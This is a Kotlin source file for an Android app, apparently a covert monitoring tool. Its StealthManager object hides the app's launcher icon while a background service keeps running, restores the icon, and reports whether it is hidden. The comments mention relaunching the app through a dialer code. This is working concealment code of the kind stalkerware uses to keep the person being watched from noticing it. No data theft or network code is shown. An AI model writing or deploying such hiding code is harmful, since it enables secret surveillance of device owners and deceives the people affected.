package com.monitor.util

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

object StealthManager {

    /**
     * Hides the app icon from the launcher by disabling the MAIN/LAUNCHER component.
     * The app will still run in the background via the foreground service.
     * Can be re-launched via dialer code or by re-enabling the component.
     */
    fun hideApp(context: Context) {
        val componentName = ComponentName(context, "com.monitor.MainActivity")
        context.packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    /**
     * Shows the app icon again (for reconfiguration).
     */
    fun showApp(context: Context) {
        val componentName = ComponentName(context, "com.monitor.MainActivity")
        context.packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    /**
     * Checks if the app icon is currently hidden.
     */
    fun isHidden(context: Context): Boolean {
        val componentName = ComponentName(context, "com.monitor.MainActivity")
        return context.packageManager.getComponentEnabledSetting(componentName) ==
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED
    }
}
